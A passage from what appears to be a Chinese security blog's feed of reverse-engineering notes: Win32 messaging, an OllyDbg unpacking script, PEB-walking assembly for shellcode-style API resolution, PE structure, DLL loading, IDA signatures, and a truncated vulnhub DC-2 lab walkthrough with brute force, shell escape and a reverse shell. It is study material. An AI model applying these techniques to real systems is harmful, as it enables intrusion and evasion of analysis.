   {                        WinExec(&quot;calc.exe&quot;,SW_SHOW);                        hCalc = FindWindowA(NULL,&quot;计算器&quot;);                    }                    SendMessage(hCalc,WM_COMMAND,wParam-0xF7D,0);                    return true;                }            }        }    }    return DefWindowProc(hwnd, uMsg, wParam, lParam);}</code></pre><p>消息循环中这样写</p><pre><code class="c">    case WM_COMMAND:        return OnWndCommand(hWnd, uMsg, wParam, lParam);</code></pre><p>按钮事件是WM_COMMAND来处理<br><code>https://docs.microsoft.com/en-us/windows/win32/menurc/wm-command</code><br>wParam高2位保存的是通知码，低2位保存的是控件ID</p><p>每个按钮能处理详细信息，注意看Notification（通知码类型）<br><code>https://docs.microsoft.com/en-us/windows/win32/controls/individual-control-info</code></p><p>根据wParam的高两位看是否是控件信息，再看wParam的低两位，代表是谁发出的这个消息。</p><p>接着我们就可以处理他了</p><p>处理的时候我<code>FindWindowA</code>查看有没有计算器处于打开状态，没有就开一个<br>最重要的一步是模拟给他发消息，就像自己给自己发一样<br> <code>SendMessage(hCalc,WM_COMMAND,83,0);</code><br> SendMessage MSDN <code>https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-sendmessage</code><br><img src="https://img-blog.csdnimg.cn/20190822110642787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><strong>上面这句理解为  我给hCalc 这个程序的控件ID为83的控件发送了一个WM_COMMAND消息</strong></p><p>最后依次找到找到他们的控件ID，就能完全模拟计算器发包了</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>编程</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Win32</tag>
+      
+      <tag>回调函数</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>简单的加密壳</title>
+    <link href="undefined2019/08/23/%E7%AE%80%E5%8D%95%E7%9A%84%E5%8A%A0%E5%AF%86%E5%A3%B3/"/>
+    <url>2019/08/23/%E7%AE%80%E5%8D%95%E7%9A%84%E5%8A%A0%E5%AF%86%E5%A3%B3/</url>
+    
+    <content type="html"><![CDATA[<p>一个简单的加密壳笔记</p><h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><ol><li>提示框，点击 “是” 后壳开始解压程序代码</li><li>有一个call来还原这个原程序的IAT表，而这个壳也是只加密了他的IAT</li><li>进入这个call后，找到GetProcessAddress函数，这个函数的返回值保存在eax里面，这个eax才是我们需要的地址，但是这个壳是把他xor加密后，存到一个virtualalloc的地址里面，然后再在这里面进行xor解密回来 。</li></ol><p><strong>判断一个壳是否脱完，要检查导入表是否是恢复完全的。</strong></p><h3 id="脱壳脚本代码"><a href="#脱壳脚本代码" class="headerlink" title="脱壳脚本代码"></a>脱壳脚本代码</h3><pre><code>// 初始化变量 // 临时变量，用来保存API地址MOV dwEAX,0 // 当EIP执行到这个地址的时候API放在EAX中 MOV dwGetProcAddr,0049d5bf// 当EIP执行到这个地址的时候IAT刚刚被填充为申请的那段内存地址// 其地址中保存的是加密后的API地址，以及动态解密代码 MOV dwWriteIATAddr,0049d5f0MOV dwOEPAddr,0044848d // IEP执行到OEP就可以dump了// 清除所有软件断点BC// 清除所有硬件断点BPHWCALL// 设置硬件执行断点BPHWS dwGetProcAddr,&quot;x&quot;BPHWS dwWriteIATAddr,&quot;x&quot;BPHWS dwOEPAddr,&quot;x&quot;LOOP1:  RUN  CASE1:  CMP eip,dwGetProcAddr  JNE CASE2     MOV dwEAX,eax       JMP LOOP1   CASE2:  CMP eip,dwWriteIATAddr    JNE CASE3  MOV [edi],dwEAX     JMP LOOP1     CASE3:  CMP eip,dwOEPAddr     JNE LOOP1  MSG &quot;到达OEP，可以dump了！！！&quot;</code></pre><h3 id="脱壳视频和样本"><a href="#脱壳视频和样本" class="headerlink" title="脱壳视频和样本"></a>脱壳视频和样本</h3><p>链接：<a href="https://pan.baidu.com/s/1wkwLIm_plmru5Ao6kzvzwA" target="_blank" rel="noopener">https://pan.baidu.com/s/1wkwLIm_plmru5Ao6kzvzwA</a> 密码：usua</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>docker</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>脱壳</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>MASH和内联MASH</title>
+    <link href="undefined2019/08/22/MASH%E5%92%8C%E5%86%85%E8%81%94MASH/"/>
+    <url>2019/08/22/MASH%E5%92%8C%E5%86%85%E8%81%94MASH/</url>
+    
+    <content type="html"><![CDATA[<p>开始前一定先了解下汇编的种类<code>https://blog.csdn.net/ye1223/article/details/79060434</code></p><p>我这里只简述我学习的<strong>MASH汇编</strong>和<strong>内联的MASH格式</strong>的汇编</p><h3 id="mash-汇编如下"><a href="#mash-汇编如下" class="headerlink" title="mash 汇编如下"></a>mash 汇编如下</h3><p>下面程序的目的是遍历Kernel32模块的导出函数和基值，在shellcode中可以用到</p><pre><code class="mash">.386.model flat,stdcalloption casemap:none; 包含printf函数所在的头文件和库文件include msvcrt.inc ; 微软vc运行时库的头文件,           ; 一般包含的时c语言的各个头文件includelib msvcrt.lib ; 包含头文件所对应的库文件assume fs:nothing.const ; 全局常量g_formtStr db &quot;%-40s      &quot;,0g_formtInt db &quot;%d &quot;,0ah,0g_formtHex db &quot;%08X &quot;,0ah,0.codeGetA proc    LOCAL @addOfFunc;    LOCAL @AddOfName;    LOCAL @AddOfNaOrd;    LOCAL @Sum;    mov eax,fs:[48];fs表示当前线程的teb结构，eax为PEB的地址    mov eax,[eax+12];获取这个进程的导入dll    mov eax,[eax+28];获取PEB_LDR_DATA结构v     mov eax,[eax];获取第一个结构的值    mov eax,[eax];获取第一个结构的值    mov ebx,[eax+8h];ebx=dll基质    mov eax,[ebx+3ch]    mov eax,[eax+ebx+78h]    add eax,ebx    mov ecx,[eax+14h];//Sumfunc    mov edx,[eax+1ch];//AddressOfFunctions    mov esi,[eax+20h];//AddressOfNames    mov edi,[eax+24h];//AddressOfNameOrdinals    add edx,ebx;    add esi,ebx;    add edi,ebx;//edi 已经是第一个符号的地址（2字节）    mov @addOfFunc,edx;    mov @AddOfName,esi;    mov @AddOfNaOrd,edi;    ;mov ecx,10;    mov @Sum,ecx;    xor ecx,ecx;清空计数器LL1:    push ecx;因为printf会影响ecx,eax,edx的值，所以只要把这个push到栈中临时保存    mov eax,[esi+ecx*4];esi指向的是AddressOfNames的RVA表地址，每一个RVA都是一个DWORD 所以要*4    add eax,ebx;ebx是这个dll的基值     push eax ; offset 伪指令能够取到一个标识符的地址    push offset g_formtStr;输出格式    call crt__cprintf ; 调用函数    add esp,8;//打印Func名字     pop ecx;把偏移pop出来使用    mov eax,@AddOfNaOrd;取符号表的基值    add eax,ecx;    add eax,ecx;这里的两个add是因为每个符号表只占一个WORD，（等于eax+ecx*2)    mov eax,[eax];拿出这个偏移的符号值    and eax,0FFFFh;应为eax是DWORD 而我们只要内存中的低四位，所以这样取    push ecx;还是因为prinf会破坏ecx的值     ;push eax ; offset 伪指令能够取到一个标识符的地址    ;push offset g_formtInt    ;call crt__cprintf ; 调用函数    ;add esp,8;//打印名字     mov edx,@addOfFunc;    add edx,eax;    add edx,eax;    add edx,eax;    add edx,eax;这里也和上面一样，相当于edx+eax*4,因为函数地址=BaseAddressOfFunctions+对应符号表值    mov edx,[edx];取AddressOfFunctions指向的地址    add edx,ebx;这个地址是RVA要加上dll的BASE    ;call edx;    push edx ; offset 伪指令能够取到一个标识符的地址    push offset g_formtHex;a    call crt__cprintf ; 调用函数    add esp,8;//打印名字     pop ecx    add ecx ,1;    cmp ecx,@Sum    jne LL1    retGetA endpmain:    call GetA;    ret end mainend </code></pre><h3 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h3><p>使用这种汇编可以提高我们生产效率,完全可以写成shellcode，任何函数都能自己实现，自己调用，不需要静态导入函数，全部动态自己调用导入函数的API</p><p>内联函数的硬编码确实是个麻烦事，找到了如下的解决方案，在代码段写数据，然后跳过他</p><pre><code class="c">#include &quot;windows.h&quot;FARPROC LoadLibA(char *szModlePath,char* funcName){    /*    __IN szModlePath 要导入的dll地址    __IN funcName 要查询这个dll里面的具体函数名    __return 返回值是一个远call，保存的是这个funcName的地址    */    __asm    {        mov eax,FS:[30h];        mov eax,[eax+0Ch];        mov eax,[eax+1Ch];//这个是第一个ldr_data结构指向第一个模块        mov eax,[eax];//拿到第一个模块的门三地址  C:\Windows\system32\KERNELBASE.dll        mov eax,[eax]//kernel32.dll        mov ebx,[eax+08h];//GetDllBase = ebx        //         现在进去dll内存操作        mov eax,[ebx+3Ch];        mov eax,[eax+ebx+78h];        add eax,ebx;        mov edi,[eax+1Ch];        add edi,ebx;     //edx = AddressOfFunctions这张表的基值(已经指向第一个无名函数了)        //查表，LoadLibraryW在kernel32中符号位为0x341    LoadLibraryA = 0x33e        //mov esi,341H;        mov esi,33EH; //LoadLibraryW        sub esi,1h;//可以不用管        mov eax,[edi+esi*4];        add eax,ebx;//LoadLibraryW的地址        push szModlePath        call eax    //eax = 获取dll的起始地址        mov esi,246h;//GetProcAddress        sub esi,1;        mov ecx,[edi+esi*4];        add ecx,ebx;        jmp L1szFuncName: _EMIT &#39;A&#39;            _EMIT &#39;d&#39;            _EMIT &#39;d&#39;            _EMIT 0x00            //硬编码字符串在代码段L1:        //push offset szFuncName;        push funcName;        push eax;        call ecx;//获取到funcName的地址，返回到eax中        //call eax;//执行这个func    }       //函数返回都是eax方式返回}int main(){    FARPROC Addr =LoadLibA(&quot;user32.dll&quot;,&quot;MessageBoxA&quot;);    __asm    {        push 0;        push 0;        push 0;        push 0;        call eax;    }    return 0;}</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>编程</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>shellcode</tag>
+      
+      <tag>内联汇编</tag>
+      
+      <tag>mash</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>PE的一些结构笔记</title>
+    <link href="undefined2019/08/20/PE%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/"/>
+    <url>2019/08/20/PE%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/</url>
+    
+    <content type="html"><![CDATA[<h3 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a>实模式</h3><p>开电脑一瞬间，就处于实模式，1M寻址<br> dos 使用实模式</p><h3 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h3><p>windows在保护模式</p><p>windows me 是windows 9x系列的最后一个</p><p>windows NT 2000以后的 现在的都是NT系列的</p><p>不同进程使用操作系统的共享地址</p><p>com 的特点就是没有特点</p><h3 id="PE格式解释"><a href="#PE格式解释" class="headerlink" title="PE格式解释"></a>PE格式解释</h3><p>有用的字段<br><img src="https://img-blog.csdnimg.cn/20190729164137634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h4 id="dos头的最后一个双字，指向PE头的起始地址"><a href="#dos头的最后一个双字，指向PE头的起始地址" class="headerlink" title="dos头的最后一个双字，指向PE头的起始地址"></a>dos头的最后一个双字，指向PE头的起始地址</h4><p><img src="https://img-blog.csdnimg.cn/20190729152522199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h4 id="File-header的大小永远是固定的20字节，下面4个字段比较重要"><a href="#File-header的大小永远是固定的20字节，下面4个字段比较重要" class="headerlink" title="File header的大小永远是固定的20字节，下面4个字段比较重要"></a>File header的大小永远是固定的20字节，下面4个字段比较重要</h4><ul><li>Machine：表示这个程序是什么架构的 </li><li>NumberOfSections:表示这个程序有多少个节</li><li>SizeofOptionalHeader：表示optionsHeader的大小 </li><li>Characters:表示这个程序的一些特性</li></ul><h4 id="Optional-header-：是必要的头"><a href="#Optional-header-：是必要的头" class="headerlink" title="Optional header ：是必要的头"></a>Optional header ：是必要的头</h4><p><img src="https://img-blog.csdnimg.cn/20190729165143140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>介绍一下重要的属性<br>AddressOfEntryPoint：程序执行入口的RVA<br>BaseOfCode：代码节的起始RVA<br>imageBase：程序的建议装载地址<br>SectionAlignment:内存中的节的对齐粒度<br>FileAlignment：文件中的对齐粒度<br>MajorOperatingSystemVersion:要求操作系统最低版本号的主版本号（Windows XP是5.1）主版本为5 ，次版本为1</p><p>Subsystem：文件的子系统<br>DllCharacteristics：dll的属性<br>Sizeofimage:这个地方的大小可以不和文件一致，但原始文件一般是相符的，所以程序被篡改后添加新节后，这个地方就会不同<br><img src="https://img-blog.csdnimg.cn/20190729142156504.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h4 id="Section-Headers-这里填写了各个节的文件偏移和内存偏移。"><a href="#Section-Headers-这里填写了各个节的文件偏移和内存偏移。" class="headerlink" title="Section Headers:这里填写了各个节的文件偏移和内存偏移。"></a>Section Headers:这里填写了各个节的文件偏移和内存偏移。</h4>]]></content>
+    
+    
+    <categories>
+      
+      <category>课堂学习</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>PE</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>调用dll和编写dll的几种格式</title>
+    <link href="undefined2019/08/20/%E8%B0%83%E7%94%A8dll%E5%92%8C%E7%BC%96%E5%86%99dll%E7%9A%84%E5%87%A0%E7%A7%8D%E6%A0%BC%E5%BC%8F/"/>
+    <url>2019/08/20/%E8%B0%83%E7%94%A8dll%E5%92%8C%E7%BC%96%E5%86%99dll%E7%9A%84%E5%87%A0%E7%A7%8D%E6%A0%BC%E5%BC%8F/</url>
+    
+    <content type="html"><![CDATA[<h2 id="dll的写法"><a href="#dll的写法" class="headerlink" title="dll的写法"></a>dll的写法</h2><p>一共两种</p><h3 id="全部写在dllmain函数内"><a href="#全部写在dllmain函数内" class="headerlink" title="全部写在dllmain函数内"></a>全部写在dllmain函数内</h3><pre><code class="c">extern &quot;C&quot; _declspec(dllexport)DWORD Sum(int nArg1,char*nArgv2){    MessageBox(0,&quot;this Sum call&quot;,0,MB_OK);    return nArg1;}</code></pre><p><code>extern &quot;C&quot;</code> 表示使用C的编译方式编译，C++格式</p><p><code>_declspec(dllexport)</code>将一个函数申明为导出函数</p><p>就申明了一个导出函数</p><p>但是这中创建的dll的导出函数序号是连续的，我们不可控的。<br>也就是Base是1，然后符号表从1 开始。</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>项目新建<br><img src="https://img-blog.csdnimg.cn/20190815120548672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br> 添加一个def文件<br>def中的代码</p><pre><code class="c">LIBRARY    &quot;def导出函数Demo&quot;EXPORTStest1 @1test2 @5test3 @8</code></pre><p>dllmain中的代码</p><pre><code class="c">// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;stdafx.h&quot;void test3(){    MessageBox(0,&quot;test3&quot;,0,MB_OK);}void test2(){    MessageBox(0,&quot;test2&quot;,0,MB_OK);}void test1(){    MessageBox(0,&quot;test1&quot;,0,MB_OK);}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><p><strong>def里面定义的就是函数名和序号对应关系</strong></p><p><strong>在PE解析工具中，在AddressOfNameOrdinals 中对应的是减去Base的值，可以用这个值直接去AddressOfFunction 表中找到这个偏移，就能拿到这个函数在dll中的地址了</strong> </p><h1 id="加载dll的几种方式"><a href="#加载dll的几种方式" class="headerlink" title="加载dll的几种方式"></a>加载dll的几种方式</h1><h3 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h3><p>创建空项目</p><p>main.c代码</p><pre><code class="c">#include &quot;stdio.h&quot;#include &lt;Windows.hcint main(){    typedef void (*func)();    HMODULE hMo = LoadLibrary(&quot;dll.dll&quot;);    func T3 = (func)(GetProcAddress(hMo,&quot;test3&quot;));    //func T3 = (func)(GetProcAddress(hMo,MAKEINTRESOURCE(8)));    T3();} </code></pre><h3 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h3><p>main.c代码</p><pre><code class="c">#include &quot;stdio.h&quot;#include &lt;Windows.h&gt;int main(){    int(*func)();    HMODULE hMo = LoadLibrary(&quot;dll.dll&quot;);    (FARPROC*)func = GetProcAddress(hMo,&quot;test3&quot;);    //(FARPROC*)func = GetProcAddress(hMo, MAKEINTRESOURCE(8));    func();}</code></pre><p>以序号查找导出函数地址 使用关键字 <code>MAKEINTRESOURCE()</code>括号中值填序号表中对应值+Base<br>例如你要导入上面dll 序号为8的函数<br>这里假如基值为1</p><ul><li>第一步，找到序号表的VA，遍历序号表 </li><li>第二步，<strong>当序号表对应的值+1=8时</strong>，这里面的值7就是你要找到的函数符号了</li><li>第三步，拿这个符号表中的值（7），在地址表中对应偏移就是这个函数地址了（地址表VA+4*7，这个地址你要找以8为序号导出函数的地址）</li></ul><h3 id="调试DLL"><a href="#调试DLL" class="headerlink" title="调试DLL"></a>调试DLL</h3><p>可能有人疑惑，dll怎么调试，加载的时候又不能printf打印消息</p><p>其实是可以使用<code>DbgPrint</code>来向操作系统发送dbg消息的</p><p>然后使用<code>DebugView</code>来获取系统的调试信息，包括内核调试信息，都是能够获取到的</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>编程</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>dll</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>IDA制作签名</title>
+    <link href="undefined2019/08/18/IDA%E5%88%B6%E4%BD%9C%E7%AD%BE%E5%90%8D/"/>
+    <url>2019/08/18/IDA%E5%88%B6%E4%BD%9C%E7%AD%BE%E5%90%8D/</url>
+    
+    <content type="html"><![CDATA[<p>我这里使用的是IDA6.8的制作签名包<br>如果我们知道是什么语言 的，但是没有签名包，就自己做一个</p><h3 id="手工方式："><a href="#手工方式：" class="headerlink" title="手工方式："></a>手工方式：</h3><pre><code>1.pcf.exe source.lib XXXX.pcf2.sigmake.exe XXXX.pcf YYYY.sig这里一般会生成一个XXXX.exc的文件，打开它，删除以；开始的几行，保存退出3.再次执行sigmake.exe XXXX.pcf YYYY.sig，就会看到有YYYY.sig的签名文件了</code></pre><p>然后把这个文件拷贝到IDA目录下的sig文件夹下面<br>接着重启IDA，拖入自己的项目，按shift + F5 打开签名文件管理器，右键添加就可以了</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>网上有脚本，但是运行不了，我小改了一下，效果还不错<br><img src="https://img-blog.csdnimg.cn/20190808133028934.gif" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p>如果要制作单个sig的话，可以直接使用脚本中的lib2sig.bat<br>用法：<br>    <code>lib2sig.bat vclibxxx.lib</code><br>直接生成一个sig文件</p><p>链接: <a href="https://pan.baidu.com/s/16vuDXs298KBNT7LzRJnwLw" target="_blank" rel="noopener">https://pan.baidu.com/s/16vuDXs298KBNT7LzRJnwLw</a> 提取码: f2by </p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>IDA</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>call的几种传参方式</title>
+    <link href="undefined2019/08/10/call%E7%9A%84%E5%87%A0%E7%A7%8D%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F/"/>
+    <url>2019/08/10/call%E7%9A%84%E5%87%A0%E7%A7%8D%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F/</url>
+    
+    <content type="html"><![CDATA[<p>stdcall 参数使用栈，平衡是在函数内，通过函数内的最后一个retn X来平衡，这个X用来指定pop几个字来平衡堆栈 </p><p>cdecl 栈传参，函数外平衡堆栈</p><p>fastcall 是通过寄存器，因为是寄存器fast嘛</p><p><strong>下面这种call是用在有类对象引用的时候来表示传参的</strong><br>thiscall 是用ecx来穿this指针的，一般都是 类似<code>lea ecx [ebp+var_20]</code><br>进入函数函数后  ecx就能会直接拿来用，不会再次赋值。</p><p><strong>识别参数个数</strong><br>1.点亮call后依次进去看调用的方式，非stdcall则再看参数的中占用大小<br>2.划分push 的归属<br>3.遇到栈平衡相关指令。点亮push核对下已分配是否有误<br>4.注意识别出某些push为下一个函数所用<br>5.另外还要看某push归属于某个函数的最后参数却不使用的参数<br>不确定的可以call进函数里，看看最后函数返回的时候堆栈平衡的参数大小，来确定传入参数</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>传参方式</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>调试dll的两种方法</title>
+    <link href="undefined2019/08/10/%E8%B0%83%E8%AF%95dll%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
+    <url>2019/08/10/%E8%B0%83%E8%AF%95dll%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
+    
+    <content type="html"><![CDATA[<p>首先把dll调起来看看</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>自己写loadlibrary()和GetProcAddress()来加载dll。</p><p>编写有一个导出函数的测试 的 A.dll</p><pre><code class="c">// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;stdafx.h&quot;extern &quot;C&quot; _declspec(dllexport)DWORD Sum(int nArg1,char*nArgv2){    MessageBox(0,&quot;this Sum call&quot;,0,MB_OK);    return nArg1;}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        MessageBox(0,&quot;The DLL_PROCESS_ATTACH...&quot;,0,MB_OK);        break;    case DLL_THREAD_ATTACH:        MessageBox(0,&quot;The DLL_THREAD_ATTACH...&quot;,0,MB_OK);        break;    case DLL_THREAD_DETACH:        MessageBox(0,&quot;The DLL_THREAD_DETACH...&quot;,0,MB_OK);        break;    case DLL_PROCESS_DETACH:        MessageBox(0,&quot;The DLL_PROCESS_DETACH:...&quot;,0,MB_OK);        break;    }    return TRUE;}</code></pre><p>编译后到ida中看看他的导入表<br><img src="https://img-blog.csdnimg.cn/20190809131554388.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>双击看看结构<br><img src="https://img-blog.csdnimg.cn/20190809131752391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>注意这里的个call的方法</p><p>我们这里编写一个load.exe来加载上面的A.dll</p><pre><code class="c">#include &quot;windows.h&quot;//定义dll中要用的函数typedef unsigned int  (*Sum)(int nArg1, char *nArgv2);int main(){    //加载dll    HMODULE Hmo = LoadLibraryA(&quot;A.dll&quot;);    //获取函数地址    Sum Abo = (Sum)GetProcAddress(Hmo,&quot;Sum&quot;);    //调用函数    Abo(1,NULL);    return 0;}</code></pre><p>我们可以使用OD或x64dbg来调试看看</p><p>调试前可以先把exe的地址随机化关了。<br>用010edit打开load.exe十六进制搜索40 81，改为 00 81，保存就OK了</p><p><img src="https://img-blog.csdnimg.cn/20190809133035515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p>执行到main函数，看到了这个load dll的地方<br><img src="https://img-blog.csdnimg.cn/20190809133410193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>loadLibrary()返回地址在eax中<br><img src="https://img-blog.csdnimg.cn/2019080913362427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>获取到函数地址后<br><img src="https://img-blog.csdnimg.cn/20190809133714552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p>开始真正调用执行这个dll中的函数了，接着F7进去就是DLL中的代码了。</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>直接拖进OD，这样只能调试dll的入口函数。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>调试dll</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>vulnhub 靶机系列 dc-2</title>
+    <link href="undefined2019/06/15/dc-2/"/>
+    <url>2019/06/15/dc-2/</url>
+    
+    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/dc-2,311/" target="_blank" rel="noopener">靶机地址</a></p><h2 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h2><p>我在这里使用VM虚拟机来搭建环境</p><p>攻击机为 Parrot 使用桥接本机无线网卡 IP：192.168.43.230/24</p><p>靶机为 dc-2 使用桥接本机无线网卡 </p><h2 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h2><p>主机发现<br><img src="dc2.png" srcset="/img/loading.gif" alt><br>扫描主机详细信息，发现有web服务和一个修改了端口的ssh<br><img src="dc3.png" srcset="/img/loading.gif" alt><br>根据作者的说明，需要parrot的hosts文件，才能正常访问web网站<br><img src="dc5.png" srcset="/img/loading.gif" alt><br>修改后记得重启网络  <code>service netwoking restart</code>,访问 <a href="http://dc-2" target="_blank" rel="noopener">http://dc-2</a> 成功找到flag1<br><img src="dc6.png" srcset="/img/loading.gif" alt><br>发现是Wordpress框架的网站，那就直接上Wpscan,但是parrot或kali虽然自带，但是都需要update，但是会出现请求超时（搭梯子都不行），直接开始枚举用户名<br><img src="dc7.png" srcset="/img/loading.gif" alt><br>发现有三个用户名 admin jerry tom<br><img src="dc8.png" srcset="/img/loading.gif" alt><br>把他们都保存到保存到一个文本里，后面的爆破需要用到<br><img src="dc9.png" srcset="/img/loading.gif" alt><br>这里有点坑，用常用字典跑步不出来，然后认真读了下flag发现作者提示使用cewl来搜集密码。。。这里保存到pass.txt<br><img src="dc10.png" srcset="/img/loading.gif" alt><br>然后是爆破对应密码，docker wpscan使用见下文<br><img src="dc11.png" srcset="/img/loading.gif" alt><br>很不错，跑出来了两个，如图所示<br><img src="dc12.png" srcset="/img/loading.gif" alt><br>wordoress 后台地址默认是 /wp-admin，<br><img src="dc13.png" srcset="/img/loading.gif" alt><br>先使用tom登陆，什么都没有，然后看了下jerry的，发现了flag2<br><img src="dc14.png" srcset="/img/loading.gif" alt><br>没什么头绪了，试试ssh，jerry的没有远程登陆权限，tom能登上<br><img src="dc15.png" srcset="/img/loading.gif" alt><br>ls看到flag3 但是没有cat命令，于是我们看看$PATH(然后在ls /home/tom/usr/bin)可以看到可使用的命令，发现只有四个可用 (ls less scp vi) OTZ<br><img src="dc16.png" srcset="/img/loading.gif" alt><br>vi 直接看flag3 ，他说jerry权限比较高，我们应该尝试切换到jerry</p><p>因为命令太少了，su也没有，我们现在需要更多的命令<br><img src="dc17.png" srcset="/img/loading.gif" alt><br>使用scp远程拷贝，加入dc-2的usr目录里（这里的ip地址使用之前的，我这里是重启了虚拟机，IP地址改变了）<br><img src="dc18.png" srcset="/img/loading.gif" alt><br>可以看到我们可以使用的命令多了很多，可以看到有python<br><img src="dc19.png" srcset="/img/loading.gif" alt><br>使用python弹回一个shell<br><img src="dc20.png" srcset="/img/loading.gif" alt><br>这个shell可以export 目录 将su所在的目录加入到$PATH，这样我们就可以使用su 切换用户了<br><img src="dc21.png" srcset="/img/loading.gif" alt></p><p>在jerry目录下有个flag4 里面提示git  <a href="http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/" target="_blank" 